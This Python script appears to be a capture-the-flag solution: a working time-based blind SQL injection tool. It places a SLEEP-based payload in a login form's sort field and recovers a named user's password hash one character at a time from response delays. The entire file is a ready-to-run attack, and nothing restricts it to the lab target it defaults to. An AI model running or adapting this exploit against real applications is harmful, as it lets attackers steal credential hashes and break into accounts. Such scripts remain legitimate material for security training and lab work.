import argparse
import time
import urllib.parse
import urllib.request
from urllib.error import URLError


def build_payload(username: str, position: int, char: str, delay: int) -> str:
    return (
        "created_at, IF(SUBSTRING((SELECT password_hash FROM users "
        f"WHERE username='{username}'), {position}, 1) = '{char}', "
        f"SLEEP({delay}), 1)"
    )


def measure_delay(
    url: str,
    username: str,
    position: int,
    char: str,
    delay: int,
    timeout: int,
    opener: urllib.request.OpenerDirector,
) -> float:
    payload = build_payload(username, position, char, delay)
    data = urllib.parse.urlencode(
        {
            "username": "invalid",
            "password": "invalid",
            "sort": payload,
        }
    ).encode("utf-8")

    start = time.monotonic()
    with opener.open(url, data=data, timeout=timeout):
        pass
    return time.monotonic() - start


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Time-based SQLi hash extractor for the CTF app"
    )
    parser.add_argument("--base-url", default="http://127.0.0.1:5000")
    parser.add_argument("--username", default="clinician")
    parser.add_argument("--delay", type=int, default=3)
    parser.add_argument("--threshold", type=float, default=2.5)
    parser.add_argument(
        "--length",
        type=int,
        default=64,
        help="Expected hash length (SHA-256 hex is 64).",
    )
    parser.add_argument(
        "--charset",
        default="0123456789abcdef",
        help="Character set to brute-force per hash position.",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=15,
        help="HTTP timeout in seconds (should be > delay).",
    )
    parser.add_argument(
        "--preflight",
        action="store_true",
        help="Run a quick connectivity check before probing.",
    )
    parser.add_argument(
        "--use-proxy",
        action="store_true",
        help="Use system proxy settings (default: disabled).",
    )
    args = parser.parse_args()

    login_url = f"{args.base_url.rstrip('/')}/login"

    if args.use_proxy:
        opener = urllib.request.build_opener()
    else:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

    if args.preflight:
        try:
            request = urllib.request.Request(login_url, method="GET")
            with opener.open(request, timeout=5):
                print("Preflight OK: login page reachable.")
        except URLError as exc:
            print(f"Preflight failed: {exc}. Is the app running on {login_url}?")
            return

    extracted = []
    for position in range(1, args.length + 1):
        found = False
        for char in args.charset:
            try:
                elapsed = measure_delay(
                    login_url,
                    args.username,
                    position,
                    char,
                    args.delay,
                    args.timeout,
                    opener,
                )
            except TimeoutError:
                print(
                    "Request timed out. Increase --timeout or check server reachability."
                )
                return
            except URLError as exc:
                print(
                    f"Request failed: {exc}. Check that the server is reachable."
                )
                return
            print(
                f"Position {position}/{args.length} char {char!r}: {elapsed:.2f}s"
            )
            if elapsed >= args.threshold:
                extracted.append(char)
                print(
                    f"Matched position {position}: {char} (hash so far: {''.join(extracted)})"
                )
                found = True
                break
        if not found:
            print(
                f"No match found at position {position}. Adjust --charset or timing."
            )
            return

    hash_value = "".join(extracted)
    print(f"Extracted hash: {hash_value}")


if __name__ == "__main__":
    main()
